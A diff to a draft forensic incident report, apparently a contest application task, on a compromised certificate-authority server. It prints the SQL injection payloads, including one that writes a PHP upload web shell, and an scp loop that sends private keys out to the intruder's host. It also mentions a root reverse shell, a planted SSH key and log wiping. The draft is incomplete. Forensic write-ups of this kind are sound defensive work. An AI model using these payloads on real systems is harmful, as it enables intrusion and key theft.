@@ -130,7 +130,7 @@ The server itself has the IP address `192.168.0.1``. The consultant used the use
 
 |Description
 |The disk image was created by the customer and handed over to the investigator
-|=== 
+|===
 
 .Basic server information
 Hostnames:: caserver.smallcompany.local caserver localhost.localdomain localhost
@@ -146,7 +146,9 @@ programs:: php, apache, sudo, apk,
 Name:: Peter
 Username:: peter
 IP:: 192.168.223.223
-Tools:: Nikto sqlmap
+Tools:: Nikto sqlmap c99
+Hostname:: workstation5728484
+RSA public key:: Shown in <<intruder-ssh-key>>
 
 ==== Consultant
 
@@ -158,16 +160,84 @@ Some information about the consultant.
 === Timeline
 
 2015-09-25T06:41:16:: Consultant logs in for the first time from 192.168.23.5
+Consultant set mysql root password to `password2015!`
+2015-09-25T06:53:51:: Consultant creates cakey.pem
+  Contains the private key of the CA
+2015-09-25T06:55:32:: Consultant creates caroot.pem
+2015-09-25T08:01:50:: Consultant creates the vulnerable `webserverCtrl.c` (<<webserverctrl>>)
+2015-09-25T08:04:19:: Consultant builds and sets the SUID bit on `webServerCtrl`
+
 2015-09-25T08:04:10:: Intruder started probing endpoints from 192.168.223.223
-2015-09-25T08:10:05:: Intruder placed `test.csv`
-2015-09-25T08:11:04:: Intruder placed `upload.php`
-2015-09-25T08:24:??:: Intruder starts first ash session
-08:24:17:: Intruder exfiltrates `cakey.pem
-08:2[4-6]:??:: Intruder fails to exfiltrate `*key.pem`
+  Maybe usign nikto
+2015-09-25T08:06:29:: Intruders tooling triggers the SQL injection vulnerability for the first time
+2015-09-25T08:07:05:: Intruder started sqlmap using the discovered injection
+  They probably get the whole database schema, not sure
+2015-09-25T08:10:05:: Intruder confirmed SQL injection by placing `/var/www/localhost/htdocs/cache/test.csv`
+2015-09-25T08:10:42:: Intruder tries to place upload.php to `/var/www/localhost/htdocs/upload.php` but that does not work
+  Apparently did not work, but I am not sure why I did not work or how the attacker knew
+2015-09-25T08:11:04:: Intruder placed `upload.php` to `/var/www/localhost/htdocs/cache/upload.php`
+2015-09-25T08:11:12:: Intruder placed `c99.php` to `/var/www/localhost/htdocs/cache/c99.php`
+08:11:16:: Intruder starts using c99.php to run commands
+2015-09-25T08:14:58:: Intruders notices 
+2015-09-25T08:14:58:: Intruders obtains the source for webserverCtrl
+08:17:09:: Intruder verifies that webServerCtrl can be used to escalated to root.
+08:18:07:: Intruder starts a reverse shell as root using webServerCtrl.
+08:22:35:: Intruder adds their public key to the `/root/.ssh/authorized_keys`
+2015-09-25T08:24:??:: Intruder logs in via SSH as root
+2015-09-25T08:24:17:: Intruder exfiltrates `cakey.pem
+08:2[4-6]:??:: Intruder fails to exfiltrate any other key
   `for i in $(find . -name "*key.pem"); do scp $i peter@192.168.0.223.223:/home/peter/; done`
+
+08:28:56:: Intruder uploads possibly modified `ls` source code via upload.php
+08:33:33:: Intruder uploads possibly modified `ls` binary via upload.php
+08:30:54:: Intruder places working and possibly modified `ls` binary in `/bin/ls`
+08:31:04:: Intruder is listing .ssh, but doesnt do anything
+10:31:54:: Intruder deletes all the files they uploaded to `/var/www/localhost/htdocs/cache` Including upload.php
+08:32:28:: Intruder clears the `/var/logs/messages` log
+08:32:28:: Intruder clears the `/var/log/mysql/query.log` log
+08:32:28:: Intruder disconnects
+11:19:57:: Someone comes back to delete /var/www/localhost/htdocs/cache/c99.php and /tmp/ccnIANnf.c
 
 2024-04-28T12:45:00:: Investigator receives the disk image
 
+
+=== Intrusion
+
+The attacker scanned the server using sqlmap
+The form in index.html allows a SQL injection, because the inputs are not validated as shown in <<vulnerable-line>>. The attacker used the string 
+
+
+.The vulnerable line of code
+[source,php#vulnerable-line]
+----
+$query = "SELECT subject FROM certs WHERE cert_id='" . $_POST['cert_id'] . "' LIMIT 1";
+----
+
+.First SQL injection
+[source,php#first-sql-injection]
+----
+1' OR 1=1 INTO OUTFILE '/var/www/localhost/htdocs/cache/test.csv' -- 
+----
+
+.Inserting a cert with a php script as subject
+[source,php#fsecond-sql-injection]
+----
+1'; INSERT INTO certs VALUES(523, "<?php if(isset($_FILES['tfile'])){     $file_name = $_FILES['tfile']['name'];     $file_tmp =$_FILES['tfile']['tmp_name'];     move_uploaded_file($file_tmp,$file_name);     echo 'Success'; } ?> <form action='' method='POST' enctype='multipart/form-data'>     <input type='file' name='tfile' />     <input type='submit'/> </form>"); -- 
+----
+
+.Third SQL injection
+[source,php#first-sql-injection]
+----
+523' INTO OUTFILE '/var/www/localhost/htdocs/cache/upload.php' -- 
+----
+
+==== Privilege escalation
+
+The intruder intially only had acces to the `apache` user. They managed to escalate their privileges by exploiting a vulnerability in the `webserverCtrl` program created by the consultant.
+
+The `webserverCtrl` was used by the consultant to control the webserver from an unprivileged user. The C source is shown in <<webserverctrl>>. The program is supposed to use setuid to get root privileges and then allow the user to run one of two predefined commands as root. However a easily abusable buffer overflow vulnerability allows an attacker to abuse it to run arbitrary commands as root.
+
+The attacker used this to start an
 
 == Investigator activity logs
 
@@ -177,6 +247,34 @@ I did not work on any live data, so there is no risk of contaminating the eviden
 == Conclusion
 
 === Recommendations for securing the server
+
+=== Questions
+
+==== Should the certificates still be used?
+
+The certificates should no longer be used, as the root 
+
+==== Can the system still be used?
+
+No, there was an attack, while we think the attacker is gone and we could try to secure the system, we dont know if they left any undetectable backdoors.
+
+Maybe the ls thing is a backdoor
+
+==== How did the attacker get into the system?
+
+1. They used a SQL injection to place files on the server.
+2. They used that to place a php script that would make it easier for them to upload files to the server.
+3. 
+
+  * What did the attacker do?
+  * What has to be done to secure the system?
+  * Which details about the attacker can be found?
+
+==== What do you think of the configuration of the server?
+
+==== What do I think about the software written by the consultant?
+
+==== Should a CA be operated in this manner?
 
 // The head of the technology department not only expects a final report on the data but also desires a bullet-point list of suggestions for strengthening the server. Due to other ongoing projects, the server should not be rebuilt but rather utilized further. Is this advisable?
  
@@ -205,6 +303,21 @@ link:pass:[https://transfer.usd.de/index.php/s/ZPS9KT2NRsk42MA][transfer.usd.de/
 link:pass:[https://web.archive.org/web/20240417145559/https://transfer.usd.de/index.php/s/ZPS9KT2NRsk42MA/download/2024-04_Anmeldeaufgabe-hda-HackerContest-SoSe24.pdf][📁^]
 
 == Appendix
+
+[source,php]
+----
+include::disk-analysis/Export/index.php[]
+----
+
+[source,c#webserverctrl]
+----
+include::disk-analysis/Export/webserverCtrl.c[]
+----
+
+[source#intruder-ssh-key]
+----
+include::disk-analysis/Export/authorized_keys[]
+----
 
 include::scripts/trailing-scripts.adoc[]
 
